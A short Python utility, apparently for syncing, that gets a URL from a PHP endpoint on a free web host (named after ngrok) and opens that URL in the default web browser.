#sync script
import urllib.request
import webbrowser
response = urllib.request.urlopen('https://ngroksync.000webhostapp.com/index.php?func=2')
addr = response.read()
addr = addr.decode("utf-8")
webbrowser.open_new(addr)
